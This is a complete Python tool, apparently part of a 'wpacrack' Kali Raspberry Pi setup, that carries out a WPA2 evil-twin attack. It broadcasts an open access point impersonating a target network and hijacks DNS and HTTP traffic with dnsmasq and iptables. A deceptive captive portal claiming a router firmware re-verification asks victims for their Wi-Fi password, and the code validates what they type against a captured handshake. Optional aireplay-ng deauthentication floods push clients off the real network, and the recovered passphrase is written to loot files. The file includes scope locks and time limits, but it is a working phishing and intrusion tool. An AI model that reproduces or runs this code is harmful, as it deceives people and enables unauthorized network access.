#!/usr/bin/env python3
"""
eviltwin.py — scope-locked, opt-in, TIME-BOUNDED WPA2-PSK evil-twin credential capture for the
wpacrack pipeline (kali-pie). The recovery path for a PSK that won't fall to offline cracking or WPS.

Why this and not more brute force: a strong WPA2 passphrase beats wordlists and WPS. An evil twin
targets the *human* instead of the hash — it stands up an open AP impersonating the authorized
ESSID, a captive portal asks the user to "re-enter the Wi-Fi password", and every submission is
**validated against a real 4-way handshake we already captured**. Only the correct PSK is accepted,
so there is no guessing and no false loot.

SAFETY MODEL (this deceives a person, so it is gated harder than the WPS module):
  * Hard scope-lock: impersonates ONLY the `essid` + authorized BSSID/channel in wpacrack.conf.
    Refuses to run without them. It validates against that BSSID's handshake, so it cannot "succeed"
    against any other network.
  * Opt-in gate: ships DISARMED. Nothing broadcasts until `eviltwin_enabled = true`.
  * TIME-BOUNDED, single bounded session per start (NOT a 24/7 rogue AP). Hard TTL, then full
    teardown. On success it loots and AUTO-DISARMS itself. Always tears the AP down on exit/signal.
  * Runs on its own dedicated radio (`eviltwin_iface`) so it coexists with the WPA harvest; if
    pointed at the harvest's radio it takes the shared radio lock and restores monitor mode after.

Loot -> /opt/wpacrack/loot/<bssid>/eviltwin-<ts>.loot ; status -> ET_STATUS.txt ; log -> eviltwin.log
"""
import os, sys, re, time, signal, shutil, subprocess, threading, datetime, glob, fcntl
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import parse_qs, urlparse

# ---------------- config ----------------
CONF_PATHS = ["/opt/wpacrack/wpacrack.conf",
              os.path.join(os.path.dirname(os.path.abspath(__file__)), "wpacrack.conf")]
WORK       = "/opt/wpacrack"
LOOT       = WORK + "/loot"
LOG        = WORK + "/eviltwin.log"
STATUS     = WORK + "/ET_STATUS.txt"
RADIO_LOCK = WORK + "/.radio.lock"          # shared with the harvest/WPS (only used if we borrow their radio)
RUNDIR     = "/run/eviltwin"

# scope (from wpacrack.conf)
ESSID      = ""
TARGETS    = []                             # [(bssid, channel)]
HARVEST_IF = "wlan1"                         # the harvest/WPS radio (conf: iface)

# tuning / gate (from wpacrack.conf)
ENABLED        = False    # HARD GATE: nothing broadcasts unless eviltwin_enabled = true
AP_IFACE       = "wlan2"  # dedicated AP radio (a reliable AP-capable adapter). If == HARVEST_IF we time-slice.
DEAUTH_IFACE   = ""       # optional monitor radio to herd clients off the real AP (empty = passive)
TTL            = 1200     # hard cap on one session (seconds), then full teardown
PORTAL_IP      = "10.0.0.1"
PORTAL_NET     = "10.0.0.0/24"
DHCP_RANGE     = "10.0.0.50,10.0.0.150,255.255.255.0,12h"
DEAUTH_ENABLED = False    # herd clients (needs DEAUTH_IFACE in monitor mode); bounded + jittered
DEAUTH_ROUNDS  = 1        # aireplay rounds per burst (kept gentle; herding, not a flood)

REQUIRED_TOOLS = ("hostapd", "dnsmasq", "aircrack-ng", "iw", "ip")

# runtime
_children = []
_stop = threading.Event()
_found = {"psk": None, "when": None}
_radio_fd = None
_valid_cache = {}
HS_CAP = None                               # the validation handshake, chosen once at session start


def now():
    return datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

def log(msg):
    line = f"[{now()}] {msg}\n"
    try:
        with open(LOG, "a") as f: f.write(line)
    except Exception: pass
    sys.stderr.write(line)

def set_status(phase, detail=""):
    try:
        with open(STATUS, "w") as f:
            f.write(f"eviltwin STATUS @ {now()}\n  phase : {phase}\n  detail: {detail}\n"
                    f"  essid : {ESSID!r}  ap_iface: {AP_IFACE}\n")
    except Exception: pass
    log(f"{phase}: {detail}")

def _val(v):
    """Strip an inline '# comment' from a conf value and trim it (SSIDs rarely contain '#')."""
    return str(v).split("#")[0].strip()

def _truthy(v):
    return _val(v).lower() in ("1", "true", "yes", "on", "enable", "enabled")

def _int(v, default):
    try: return int(_val(v).split()[0])
    except Exception: return default

def published_channel(bssid, hint, ttl=21600):
    """Read the harvest-published current channel for this BSSID (BSSID-anchored rediscovery); fall
    back to the config hint if missing/stale. Keeps the twin on the AP's real channel after a 2.4
    auto-channel change or a 5GHz DFS move."""
    try:
        ch, ts = open(os.path.join(WORK, "channels", bssid.replace(":", ""))).read().split()
        if time.time() - float(ts) < ttl:
            return int(ch)
    except Exception:
        pass
    return hint

def run(cmd, timeout=30):
    try:
        return subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
    except Exception as e:
        log(f"run error {cmd}: {e}"); return None


def load_conf():
    global ESSID, TARGETS, HARVEST_IF, ENABLED, AP_IFACE, DEAUTH_IFACE, TTL
    global PORTAL_IP, DEAUTH_ENABLED
    path = next((p for p in CONF_PATHS if os.path.exists(p)), None)
    if not path:
        log("FATAL: no wpacrack.conf"); sys.exit(2)
    cfg = {}
    for line in open(path):
        line = line.strip()
        if line and not line.startswith("#") and "=" in line:
            k, v = line.split("=", 1); cfg[k.strip().lower()] = v.strip()
    ESSID = _val(cfg.get("essid", ""))
    HARVEST_IF = _val(cfg.get("iface", HARVEST_IF)) or HARVEST_IF
    ENABLED = _truthy(cfg.get("eviltwin_enabled", "false"))
    AP_IFACE = _val(cfg.get("eviltwin_iface", AP_IFACE)) or AP_IFACE
    DEAUTH_IFACE = _val(cfg.get("eviltwin_deauth_iface", ""))
    TTL = _int(cfg.get("eviltwin_ttl"), TTL)
    if "eviltwin_portal_ip" in cfg and _val(cfg["eviltwin_portal_ip"]): PORTAL_IP = _val(cfg["eviltwin_portal_ip"])
    DEAUTH_ENABLED = _truthy(cfg.get("eviltwin_deauth", "false"))
    TARGETS = []
    for tok in cfg.get("targets", "").split(","):
        tok = tok.strip()
        if ":" in tok:
            bssid, _, ch = tok.rpartition(":")
            if re.match(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$", bssid.strip()) and ch.strip().isdigit():
                TARGETS.append((bssid.strip().upper(), int(ch.strip())))
    if not ESSID or not TARGETS:
        log("FATAL: eviltwin needs both `essid` and an authorized `targets` BSSID:CH in wpacrack.conf "
            "(scope-lock) — refusing to run."); sys.exit(2)


def preflight():
    missing = [t for t in REQUIRED_TOOLS if not shutil.which(t)]
    if missing:
        log(f"FATAL: missing tools: {', '.join(missing)}"); sys.exit(3)


# ---------------- radio AP-mode health (route around broken-chipset AP support) ----------------
def _phy_of(iface):
    try: return open(f"/sys/class/net/{iface}/phy80211/name").read().strip()
    except Exception: return None

def ap_capable(iface):
    """Does the driver even advertise AP mode?"""
    phy = _phy_of(iface)
    if not phy: return False
    info = run(["iw", "phy", phy, "info"])
    return bool(info and "* AP" in (info.stdout or ""))

def _driver(iface):
    try: return os.path.basename(os.path.realpath(f"/sys/class/net/{iface}/device/driver"))
    except Exception: return ""

def ap_mode_healthcheck(iface, seconds=40):
    """Can `iface` actually SUSTAIN AP-mode TX on this Pi? Some chipsets (notably mt76x0u / the
    AWUS036ACHM) bring the AP 'up' and beacon fine for ~20-30s, then the TX path fails
    ('Failed to set beacon parameters' / 'handle_probe_req: send failed') so clients can never see
    or join. The probe therefore runs long enough (~40s) to catch that LATE failure, not just the
    first few seconds. Returns True only if the AP enabled AND transmitted cleanly the whole window.
    NOTE: flips the iface through AP mode, so never call it on the live harvest radio unminded."""
    if not os.path.exists(f"/sys/class/net/{iface}") or not ap_capable(iface):
        return False
    os.makedirs(RUNDIR, exist_ok=True)
    tconf = os.path.join(RUNDIR, f"hc-{iface}.conf"); tlog = os.path.join(RUNDIR, f"hc-{iface}.log")
    open(tconf, "w").write(f"interface={iface}\ndriver=nl80211\nssid=RADIOCHECK-DO-NOT-USE\n"
                           f"hw_mode=g\nchannel=6\n")
    run(["ip", "link", "set", iface, "down"]); run(["iw", "dev", iface, "set", "type", "__ap"])
    run(["ip", "link", "set", iface, "up"])
    enabled = txfail = alive = False
    try:
        hf = open(tlog, "w")
        p = subprocess.Popen(["hostapd", tconf], stdout=hf, stderr=subprocess.STDOUT, text=True)
        for _ in range(seconds):
            time.sleep(1)
            if p.poll() is not None: break
            txt = open(tlog).read() if os.path.exists(tlog) else ""
            if "AP-ENABLED" in txt: enabled = True
            if "Failed to set beacon" in txt or "send failed" in txt: txfail = True; break
        alive = p.poll() is None
        p.terminate()
        try: p.wait(timeout=5)
        except Exception: p.kill()
    except Exception as e:
        log(f"healthcheck {iface} error: {e}")
    run(["ip", "link", "set", iface, "down"]); run(["iw", "dev", iface, "set", "type", "managed"])
    run(["ip", "link", "set", iface, "up"])
    for f in (tconf, tlog):
        try: os.remove(f)
        except Exception: pass
    ok = alive and enabled and not txfail
    log(f"AP healthcheck {iface}: ap_enabled={enabled} tx_fail={txfail} alive={alive} -> {'OK' if ok else 'FAIL'}")
    return ok

def select_ap_iface():
    """Pick a radio that can ACTUALLY do AP mode. Prefer the configured dedicated iface, then any
    other non-harvest wlan, each health-probed; if none pass (e.g. only the mt76x0u is spare), fall
    back to borrowing the harvest radio (the reliable RTL8812AU here) via the shared lock. This is
    how the build routes around a chipset whose AP/TX support is broken. Returns (iface, borrowed)."""
    cands = []
    if AP_IFACE and AP_IFACE != HARVEST_IF and os.path.exists(f"/sys/class/net/{AP_IFACE}") \
       and _driver(AP_IFACE) != "brcmfmac":
        cands.append(AP_IFACE)
    for n in sorted(os.listdir("/sys/class/net")):
        # skip the harvest radio and the Pi's built-in wifi (brcmfmac = the box's own uplink)
        if n.startswith("wlan") and n != HARVEST_IF and n not in cands and _driver(n) != "brcmfmac":
            cands.append(n)
    for iface in cands:
        if ap_mode_healthcheck(iface):
            log(f"AP radio selected: {iface} (dedicated, TX healthy)")
            return iface, False
        log(f"{iface} not dependable for AP (TX/beacon fails or no AP mode) — trying next radio")
    log(f"no dedicated radio passed AP-mode healthcheck; borrowing the harvest radio {HARVEST_IF} "
        f"(time-sliced) — it is the reliable AP radio on this rig")
    return HARVEST_IF, True

def pre_herd(iface, bssid, ch, rounds=3):
    """One bounded deauth burst on `iface` (monitor) to nudge the real AP's clients right before we
    flip that same radio into the twin — so herding needs no second TX radio. Gentle + capped."""
    run(["iw", "dev", iface, "set", "channel", str(ch)])
    for _ in range(rounds):
        if _stop.is_set(): break
        run(["aireplay-ng", "--deauth", "1", "-a", bssid, iface], timeout=20)
        time.sleep(2)
    log(f"pre-herd: sent {rounds} bounded deauth nudge(s) on {iface} to herd clients toward the twin")


def cap_handshakes(cap, bssid):
    """How many complete 4-way handshakes for `bssid` does this cap hold (via aircrack-ng's table)."""
    try:
        p = subprocess.run(["aircrack-ng", cap], stdin=subprocess.DEVNULL,
                           capture_output=True, text=True, timeout=90)
    except Exception:
        return 0
    for line in (p.stdout or "").splitlines():
        if bssid.upper() in line.upper():
            m = re.search(r"\((\d+)\s+handshake", line)
            if m:
                return int(m.group(1))
    return 0

def select_handshake(bssid):
    """Pick a captured .cap that ACTUALLY CONTAINS a handshake for this BSSID (newest first). Many
    harvest captures hold 0 handshakes (no client re-auth in that window); validating a submitted
    PSK against those would always fail. Without any usable handshake we return None and refuse the
    session — we won't run a portal we can't verify against."""
    d = os.path.join(WORK, "library", bssid.replace(":", ""))
    cands = sorted(glob.glob(os.path.join(d, "*.cap")), key=os.path.getmtime, reverse=True)
    top = os.path.join(WORK, "handshake.cap")
    if os.path.exists(top):
        cands.append(top)
    for c in cands:
        if cap_handshakes(c, bssid) > 0:
            log(f"validation handshake selected: {c}")
            return c
    return None


def validate_psk(candidate, bssid, capfile):
    """True iff `candidate` is the real PSK for this handshake (aircrack-ng, offline, authoritative)."""
    if not capfile or len(candidate) < 8 or len(candidate) > 63:
        return False
    if candidate in _valid_cache:
        return _valid_cache[candidate]
    # feed the single candidate to aircrack-ng via a tiny wordlist on stdin
    try:
        p = subprocess.run(["aircrack-ng", "-a", "2", "-b", bssid, "-w", "-", capfile],
                           input=candidate + "\n", capture_output=True, text=True, timeout=60)
        ok = "KEY FOUND" in (p.stdout or "")
    except Exception as e:
        log(f"validate error: {e}"); ok = False
    _valid_cache[candidate] = ok
    return ok


# ---------------- radio coexistence (only when borrowing the harvest radio) ----------------
def radio_acquire(wait_max=600):
    global _radio_fd
    try:
        _radio_fd = open(RADIO_LOCK, "w")
    except Exception:
        return True
    t0 = time.time()
    while time.time() - t0 < wait_max:
        try:
            fcntl.flock(_radio_fd, fcntl.LOCK_EX | fcntl.LOCK_NB); return True
        except OSError:
            set_status("wait-radio", "harvest holds the shared radio; waiting to borrow it")
            time.sleep(15)
    return False

def radio_release():
    global _radio_fd
    if _radio_fd:
        try: fcntl.flock(_radio_fd, fcntl.LOCK_UN); _radio_fd.close()
        except Exception: pass
        _radio_fd = None


# ---------------- AP bring-up / teardown ----------------
def spawn(cmd):
    log("exec: " + " ".join(cmd))
    p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    _children.append(p)
    return p

def write_hostapd_conf(ch):
    os.makedirs(RUNDIR, exist_ok=True)
    conf = os.path.join(RUNDIR, "hostapd.conf")
    # OPEN twin on the target ESSID+channel: clients that get herded off the real AP auto-join,
    # then the captive portal does the credential capture. (Open, because we cannot know the PSK yet.)
    with open(conf, "w") as f:
        f.write(f"interface={AP_IFACE}\ndriver=nl80211\nssid={ESSID}\n"
                f"hw_mode={'a' if ch>14 else 'g'}\nchannel={ch}\n"
                f"ignore_broadcast_ssid=0\n")
    return conf

def write_dnsmasq_conf():
    conf = os.path.join(RUNDIR, "dnsmasq.conf")
    with open(conf, "w") as f:
        f.write(f"interface={AP_IFACE}\nbind-interfaces\nexcept-interface=lo\n"
                f"dhcp-range={DHCP_RANGE}\ndhcp-option=3,{PORTAL_IP}\ndhcp-option=6,{PORTAL_IP}\n"
                f"address=/#/{PORTAL_IP}\nno-resolv\nno-hosts\n")
    return conf

def ap_up(ch):
    run(["ip", "link", "set", AP_IFACE, "down"])
    run(["iw", "dev", AP_IFACE, "set", "type", "__ap"])
    run(["ip", "link", "set", AP_IFACE, "up"])
    run(["ip", "addr", "flush", "dev", AP_IFACE])
    run(["ip", "addr", "add", f"{PORTAL_IP}/24", "dev", AP_IFACE])
    os.makedirs(RUNDIR, exist_ok=True)
    hlog = os.path.join(RUNDIR, "hostapd.log")
    conf = write_hostapd_conf(ch)
    log("exec: hostapd " + conf)
    hp = subprocess.Popen(["hostapd", conf], stdout=open(hlog, "w"), stderr=subprocess.STDOUT, text=True)
    _children.append(hp)
    # watch the first seconds for TX health — catch a chipset that enables the AP but can't beacon
    enabled = txfail = False
    for _ in range(6):
        time.sleep(1)
        if hp.poll() is not None:
            log("hostapd exited during bring-up — AP radio not usable"); return False
        txt = open(hlog).read() if os.path.exists(hlog) else ""
        if "AP-ENABLED" in txt: enabled = True
        if "Failed to set beacon" in txt or "send failed" in txt: txfail = True; break
    if not enabled or txfail:
        log(f"AP bring-up unhealthy on {AP_IFACE} (enabled={enabled} tx_fail={txfail}) — chipset AP/TX broken")
        return False
    spawn(["dnsmasq", "-d", "-C", write_dnsmasq_conf()])
    # redirect all captive-portal HTTP to us
    run(["iptables", "-t", "nat", "-A", "PREROUTING", "-i", AP_IFACE, "-p", "tcp",
         "--dport", "80", "-j", "DNAT", "--to-destination", f"{PORTAL_IP}:80"])
    return True

def deauth_herd(bssid, ch):
    """Optional, bounded herding: nudge the real AP's clients so they roam to the open twin.
    Needs a monitor-mode DEAUTH_IFACE (the AP radio is busy beaconing). Gentle + jittered."""
    if not (DEAUTH_ENABLED and DEAUTH_IFACE and os.path.exists(f"/sys/class/net/{DEAUTH_IFACE}")):
        return
    run(["ip", "link", "set", DEAUTH_IFACE, "down"])
    run(["iw", "dev", DEAUTH_IFACE, "set", "type", "monitor"])
    run(["ip", "link", "set", DEAUTH_IFACE, "up"])
    run(["iw", "dev", DEAUTH_IFACE, "set", "channel", str(ch)])
    def loop():
        import random
        while not _stop.is_set() and not _found["psk"]:
            run(["aireplay-ng", "--deauth", str(DEAUTH_ROUNDS), "-a", bssid, DEAUTH_IFACE], timeout=20)
            _stop.wait(20 + random.randint(0, 15))
    threading.Thread(target=loop, daemon=True).start()

def teardown():
    set_status("teardown", "tearing down AP, DHCP, portal; restoring the box")
    _stop.set()
    for p in _children[:]:
        try: p.terminate()
        except Exception: pass
    time.sleep(1)
    for p in _children[:]:
        try: p.kill()
        except Exception: pass
    run(["iptables", "-t", "nat", "-D", "PREROUTING", "-i", AP_IFACE, "-p", "tcp",
         "--dport", "80", "-j", "DNAT", "--to-destination", f"{PORTAL_IP}:80"])
    run(["ip", "addr", "flush", "dev", AP_IFACE])
    run(["ip", "link", "set", AP_IFACE, "down"])
    # if we borrowed the harvest radio, hand it back in monitor mode; else leave managed
    if AP_IFACE == HARVEST_IF:
        run(["iw", "dev", AP_IFACE, "set", "type", "monitor"])
        run(["ip", "link", "set", AP_IFACE, "up"])
        radio_release()
    else:
        run(["iw", "dev", AP_IFACE, "set", "type", "managed"])
        run(["ip", "link", "set", AP_IFACE, "up"])


# ---------------- captive portal ----------------
PAGE = """<!doctype html><html><head><meta name=viewport content="width=device-width,initial-scale=1">
<title>{ssid} — Router Authentication</title><style>body{{font-family:system-ui,Arial;background:#f2f2f2;margin:0}}
.card{{max-width:420px;margin:8vh auto;background:#fff;padding:26px;border-radius:12px;box-shadow:0 2px 14px #0002}}
h1{{font-size:19px;margin:0 0 4px}}p{{color:#555;font-size:14px}}input{{width:100%;padding:12px;margin:10px 0;
border:1px solid #ccc;border-radius:8px;box-sizing:border-box;font-size:15px}}button{{width:100%;padding:12px;border:0;
border-radius:8px;background:#1a73e8;color:#fff;font-size:15px}}.err{{color:#c00;font-size:13px}}</style></head>
<body><div class=card><h1>{ssid}</h1><p>Your router firmware needs to be re-verified. Please confirm your
Wi-Fi password to restore the connection.</p><p class=err>{err}</p>
<form method=POST action=/submit><input type=password name=psk placeholder="Wi-Fi password" autofocus>
<button type=submit>Verify &amp; reconnect</button></form></div></body></html>"""

class Portal(BaseHTTPRequestHandler):
    def log_message(self, *a): pass
    def _send(self, body, code=200):
        b = body.encode()
        self.send_response(code)
        self.send_header("Content-Type", "text/html")
        self.send_header("Content-Length", str(len(b)))
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(b)
    def do_GET(self):
        # answer OS captive-portal probes with a redirect so the login sheet pops
        self._send(PAGE.format(ssid=ESSID, err=""))
    def do_POST(self):
        if urlparse(self.path).path != "/submit":
            self._send(PAGE.format(ssid=ESSID, err="")); return
        n = int(self.headers.get("Content-Length", 0) or 0)
        data = parse_qs(self.rfile.read(n).decode("utf-8", "replace"))
        cand = (data.get("psk", [""])[0]).strip()
        bssid, ch = TARGETS[0]
        cap = HS_CAP
        client = self.client_address[0]
        if cand and validate_psk(cand, bssid, cap):
            log(f"PORTAL: client {client} submitted the CORRECT PSK (validated vs {os.path.basename(cap or '?')})")
            _found["psk"] = cand; _found["when"] = now()
            self._send("<h2 style='font-family:system-ui;text-align:center;margin-top:20vh'>"
                       "Thanks — reconnecting…</h2>")
            threading.Thread(target=lambda: (time.sleep(1), _stop.set()), daemon=True).start()
        else:
            log(f"PORTAL: client {client} submitted a wrong password (rejected by handshake validation)")
            self._send(PAGE.format(ssid=ESSID, err="Incorrect password. Please try again."))


def serve_portal():
    httpd = ThreadingHTTPServer((PORTAL_IP, 80), Portal)
    threading.Thread(target=httpd.serve_forever, daemon=True).start()
    return httpd


# ---------------- loot ----------------
def save_loot(bssid, ch, psk):
    d = os.path.join(LOOT, bssid.replace(":", "")); os.makedirs(d, exist_ok=True)
    ts = datetime.datetime.now().strftime("%Y%m%d-%H%M%S")
    p = os.path.join(d, f"eviltwin-{ts}.loot")
    body = (f"# wpacrack EVIL-TWIN loot @ {now()}\nBSSID={bssid}\nESSID={ESSID}\nCHANNEL={ch}\n"
            f"METHOD=eviltwin-portal (validated vs captured handshake)\nWPA_PSK={psk}\n")
    with open(p, "w") as f: f.write(body)
    for h in ("/root", "/home/kali", "/home/kali-pie"):
        try: open(os.path.join(h, "eviltwin_loot.txt"), "a").write(body + "\n")
        except Exception: pass
    log(f"LOOT: recovered PSK for {bssid} -> {p}")
    return p

def auto_disarm():
    """Flip eviltwin_enabled back to false after a successful capture (one-shot success)."""
    for path in CONF_PATHS:
        if os.path.exists(path):
            try:
                s = open(path).read()
                s2 = re.sub(r"(?im)^\s*eviltwin_enabled\s*=.*$", "eviltwin_enabled = false", s)
                if s2 != s: open(path, "w").write(s2)
            except Exception as e:
                log(f"auto_disarm error: {e}")
            break


# ---------------- session ----------------
def session():
    os.makedirs(LOOT, exist_ok=True)
    load_conf()
    if not ENABLED:
        set_status("disabled", "eviltwin_enabled is not true — dormant (no AP broadcast). Arm with `sudo eviltwin-arm`.")
        return
    preflight()
    bssid, ch = TARGETS[0]
    global HS_CAP
    set_status("select-handshake", f"scanning captures for a usable handshake for {bssid}")
    HS_CAP = select_handshake(bssid)
    cap = HS_CAP
    if not cap:
        set_status("no-handshake", f"no captured handshake for {bssid} to validate against — refusing to run")
        log("refusing: without a real 4-way handshake we cannot verify a submitted PSK. "
            "Let the harvest capture one first (needs a client to (re)join)."); return
    set_status("init", f"impersonating {ESSID!r} ({bssid} ch{ch}); validating vs {os.path.basename(cap)}; TTL {TTL}s")

    # pick a radio that can actually do AP mode (routes around a broken-chipset AP/TX path)
    set_status("select-radio", "health-probing radios for dependable AP-mode TX")
    chosen, borrowed = select_ap_iface()
    globals()["AP_IFACE"] = chosen
    if borrowed and not radio_acquire():
        log("could not borrow the harvest radio in time — aborting session"); return

    def on_signal(sig, frm):
        log(f"signal {sig} — tearing down"); _stop.set()
    signal.signal(signal.SIGTERM, on_signal); signal.signal(signal.SIGINT, on_signal)

    try:
        # if we borrowed the harvest radio it's in monitor now: herd off the real AP before we flip it
        if borrowed and DEAUTH_ENABLED:
            pre_herd(chosen, bssid, ch)
        if not ap_up(ch):
            set_status("ap-failed", f"{AP_IFACE} could not sustain AP mode (chipset TX broken) — see eviltwin.log; "
                                    f"swap in an AR9271 / 2nd RTL8812AU, or set eviltwin_iface=wlan1")
            return
        serve_portal()
        deauth_herd(bssid, ch)
        set_status("live", f"open twin of {ESSID!r} on ch{ch}; captive portal up; awaiting a client submission")
        t0 = time.time()
        while not _stop.is_set() and (time.time() - t0) < TTL:
            time.sleep(2)
            if _found["psk"]:
                break
    finally:
        if _found["psk"]:
            save_loot(bssid, ch, _found["psk"])
            auto_disarm()
            set_status("success", f"PSK recovered and looted; auto-disarmed. ({_found['when']})")
        else:
            set_status("done", "session ended (TTL/stop) with no capture; AP torn down")
        teardown()


def radiocheck(force=False):
    """Report each wlan radio's AP-mode viability on this Pi (the answer to 'which adapter can be
    the twin'). Skips the live harvest radio unless --force (probing it disrupts capture)."""
    load_conf()
    print(f"harvest radio (protected): {HARVEST_IF}")
    for n in sorted(x for x in os.listdir("/sys/class/net") if x.startswith("wlan")):
        drv = _driver(n)
        if n == HARVEST_IF and not force:
            print(f"  {n} (driver={drv}): SKIP (harvest radio — use --force to test; disrupts capture)"); continue
        if drv == "brcmfmac":
            print(f"  {n} (driver={drv}): SKIP (Pi built-in wifi / box uplink — never used as the attack AP)"); continue
        ok = ap_mode_healthcheck(n)
        print(f"  {n} (driver={drv}): {'AP-CAPABLE — TX healthy, usable as the twin' if ok else 'NOT dependable for AP (beacon/probe TX fails or no AP mode)'}")


if __name__ == "__main__":
    if "--radiocheck" in sys.argv:
        radiocheck(force="--force" in sys.argv)
    else:
        session()
